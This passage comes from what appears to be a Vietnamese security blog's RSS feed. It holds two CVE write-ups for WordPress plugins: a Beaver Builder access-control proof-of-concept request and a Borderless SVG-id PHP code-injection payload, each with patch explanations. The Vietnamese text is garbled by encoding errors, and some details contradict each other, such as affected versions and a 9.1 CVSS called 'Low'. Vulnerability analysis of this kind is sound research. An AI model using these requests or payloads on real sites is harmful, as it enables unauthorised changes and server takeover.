4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Authenticated user (Contributor or higher)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Sends request to /wp-json/fl-controls/v1/*&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;REST API calls permission_callback = check_permission()&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;check_permission() ‚Üí current_user_can(&amp;#39;builder_access&amp;#39;)&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;builder_access = true for Contributor&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Request is accepted&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;set_color_presets / delete_color_presets / set_background_presets&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;Global Presets are added / modified / deleted site-wide&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login Contributor account:&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y nonce b·∫±ng c√°ch d√°n n·ªôi dung sau v√†o browser console:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Th√™m X-WP-Nonce header v√† g·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/fl-controls/v1/color_presets/ HTTP/1.1&#xA;Cookie: contributor_cookie&#xA;X-WP-Nonce: 0db9546893&#xA;&#xA;{&#xA;  &amp;#34;clearPresets&amp;#34;: true&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;L√†m t∆∞∆°ng t·ª± cho c√°c endpoint c√≤n l·∫°i.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-11726 l√† l·ªói &lt;strong&gt;Broken Access Control&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác plugin ch·ªâ ki·ªÉm tra quy·ªÅn n·ªôi b·ªô &lt;code&gt;builder_access&lt;/code&gt; ‚Äî quy·ªÅn n√†y m·∫∑c ƒë·ªãnh √°p d·ª•ng cho c√°c role c√≥ &lt;code&gt;edit_posts&lt;/code&gt; (t·ª©c &lt;strong&gt;Contributor tr·ªü l√™n&lt;/strong&gt;). V√¨ v·∫≠y, ch·ªâ c·∫ßn ƒëƒÉng nh·∫≠p, attacker ƒë√£ c√≥ th·ªÉ &lt;strong&gt;th√™m, s·ª≠a, xo√° Global Presets&lt;/strong&gt; th√¥ng qua REST API &lt;code&gt;fl-controls/v1&lt;/code&gt;, ·∫£nh h∆∞·ªüng to√†n b·ªô n·ªôi dung Beaver Builder tr√™n site.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;v2.9.4.1&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch thay &lt;code&gt;check_permission&lt;/code&gt; b·∫±ng &lt;code&gt;check_write_permission&lt;/code&gt;, y√™u c·∫ßu &lt;strong&gt;ƒë·ªìng th·ªùi&lt;/strong&gt; &lt;code&gt;builder_access&lt;/code&gt; v√† &lt;code&gt;unrestricted_editing&lt;/code&gt;, ƒë·ªìng th·ªùi gi·ªõi h·∫°n v·ªÅ &lt;strong&gt;Editor v√† Administrator&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;C√≥ x√°c th·ª±c ‚â† c√≥ ƒë·ªß quy·ªÅn (Authentication ‚â† Authorization)&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n d√πng &lt;strong&gt;default = all&lt;/strong&gt; cho quy·ªÅn nh·∫°y c·∫£m&lt;/li&gt;&#xA;&lt;li&gt;Custom permissions ph·∫£i map ƒë√∫ng v·ªõi &lt;strong&gt;WordPress core capabilities&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Endpoint thay ƒë·ªïi &lt;strong&gt;global settings&lt;/strong&gt; ph·∫£i y√™u c·∫ßu quy·ªÅn cao (Admin/Editor)&lt;/li&gt;&#xA;&lt;li&gt;So s√°nh (diff) gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° l√† c√°ch nhanh ƒë·ªÉ ph√°t hi·ªán l·ªói logic ph√¢n quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn nhi·ªÅu l·ªõp ki·ªÉm tra quy·ªÅn cho c√°c h√†nh ƒë·ªông quan tr·ªçng&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/beaver-builder-lite-version/vulnerability/wordpress-beaver-builder-wordpress-page-builder-plugin-2-9-4-missing-authorization-to-authenticated-contributor-global-preset-modification-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin &amp;lt;= 2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-11600 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-06-cve-2024-11600/</link>
      <pubDate>Sat, 06 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-06-cve-2024-11600/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The Borderless ‚Äì Widgets, Elements, Templates and Toolkit for Elementor &amp;amp; Gutenberg&lt;/strong&gt; c·ªßa WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Remote Code Execution&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;1.5.9&lt;/strong&gt; th√¥ng qua h√†m &lt;strong&gt;write_config&lt;/strong&gt;. Nguy√™n nh√¢n l√† do thi·∫øu &lt;strong&gt;sanitization&lt;/strong&gt; tr√™n file &lt;strong&gt;JSON&lt;/strong&gt; ƒë∆∞·ª£c import. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn &lt;strong&gt;Administrator-level access&lt;/strong&gt; tr·ªü l√™n, th·ª±c thi m√£ tr√™n server.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-11600&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-11600&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/borderless/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Borderless&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.1&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v1.6.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function write_config() {&#xA;    $charmap = $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] . &amp;#39;/&amp;#39; . $this-&amp;gt;paths[&amp;#39;config&amp;#39;];&#xA;    $handle  = @fopen( $charmap, &amp;#39;w&amp;#39; );&#xA;    if ( $handle ) {&#xA;        fwrite( $handle, &amp;#39;&amp;lt;?php $icons = array();&amp;#39; );&#xA;        &#xA;        // Safely build the PHP array with sanitized content&#xA;        foreach ( $this-&amp;gt;json_config[ $this-&amp;gt;ip_name ] as $icon =&amp;gt; $info ) {&#xA;            if ( ! empty( $info ) ) {&#xA;                $delimiter   = &amp;#34;&amp;#39;&amp;#34;;&#xA;                $safe_icon   = esc_attr( $icon );&#xA;                $safe_class  = esc_attr( $info[&amp;#34;class&amp;#34;] );&#xA;                $safe_tags   = esc_attr( $info[&amp;#34;tags&amp;#34;] );&#xA;&#xA;                fwrite( $handle, &amp;#34;\r\n&amp;#34; . &amp;#39;$icons[\&amp;#39;&amp;#39; . $this-&amp;gt;ip_name . &amp;#39;\&amp;#39;][&amp;#39; . $delimiter . $safe_icon . $delimiter . &amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39; . $delimiter . $safe_class . $delimiter . &amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39; . $delimiter . $safe_tags . $delimiter . &amp;#39;);&amp;#39; );&#xA;            } else {&#xA;                $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;                die( esc_html__( &amp;#39;Error generating the configuration file.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;            }&#xA;        }&#xA;        fclose( $handle );&#xA;    } else {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;Error generating the configuration file.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;write_config()&lt;/code&gt; ghi c·∫•u h√¨nh icon v√†o file PHP. M·ªói icon ƒë∆∞·ª£c ghi d∆∞·ªõi d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$icons[&amp;#39;&amp;lt;ip_name&amp;gt;&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tr∆∞·ªõc khi ghi ra file, bi·∫øn n√†y ƒë∆∞·ª£c l·∫•y t·ª´ thu·ªôc t√≠nh &lt;code&gt;id&lt;/code&gt; c·ªßa th·∫ª &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; trong SVG v√† ƒëi qua b·ªô l·ªçc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;$this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; ch·ªâ lo·∫°i b·ªè th·∫ª HTML, k√Ω t·ª± ƒëi·ªÅu khi·ªÉn v√† kho·∫£ng tr·∫Øng th·ª´a. N√≥ kh√¥ng ngƒÉn ch·∫∑n c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát nguy hi·ªÉm trong ng·ªØ c·∫£nh PHP code (v√≠ d·ª• &lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Do ƒë√≥, attacker c√≥ th·ªÉ ch√®n payload trong thu·ªôc t√≠nh &lt;code&gt;id&lt;/code&gt; c·ªßa SVG.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;font id=&amp;#34;&amp;#39;]; php_code;//&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥, d√≤ng ghi v√†o file s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$icons[&amp;#39;&amp;#39;]; php_code;//&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;] = array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v1.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;ip_name = sanitize_file_name( $this-&amp;gt;ip_name );&#xA;if ( empty( $this-&amp;gt;ip_name ) ) {&#xA;    $this-&amp;gt;ip_name = &amp;#39;unknown&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng &lt;code&gt;sanitize_file_name()&lt;/code&gt; thay cho &lt;code&gt;sanitize_text_field()&lt;/code&gt; gi√∫p lo·∫°i b·ªè to√†n b·ªô k√Ω t·ª± ƒë·∫∑c bi·ªát nguy hi·ªÉm (&lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;..&lt;/code&gt;, kho·∫£ng tr·∫Øng, Unicode ph·ª©c t·∫°p‚Ä¶) v√† chu·∫©n h√≥a chu·ªói th√†nh t√™n file/key an to√†n. ƒêi·ªÅu n√†y ngƒÉn ch·∫∑n vi·ªác ch√®n payload ph√° v·ª° c√∫ ph√°p PHP trong file c·∫•u h√¨nh.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#39; alt=&#34;Diff&#34; height=&#34;146&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω submenu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function borderless_icon_fonts_submenu() {&#xA;    $icon_manager_page = add_submenu_page(&#xA;        &amp;#39;borderless.php&amp;#39;,&#xA;        esc_html__( &amp;#34;Icon Fonts&amp;#34;, &amp;#34;borderless&amp;#34; ),&#xA;        esc_html__( &amp;#34;Icon Fonts&amp;#34;, &amp;#34;borderless&amp;#34; ),&#xA;        &amp;#39;manage_options&amp;#39;,&#xA;        &amp;#39;borderless-fonts&amp;#39;,&#xA;        &amp;#39;borderless_custom_icons_menu&amp;#39;&#xA;    );&#xA;    $Borderless_IF  = new Borderless_IF;&#xA;    add_action(&amp;#39;admin_print_styles-&amp;#39; . $icon_manager_page, array( $Borderless_IF, &amp;#39;admin_scripts&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;Icon Fonts&#39;&lt;/code&gt;: Title c·ªßa submenu&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;manage_options&#39;&lt;/code&gt;: Menu n√†y ch·ªâ d√†nh cho 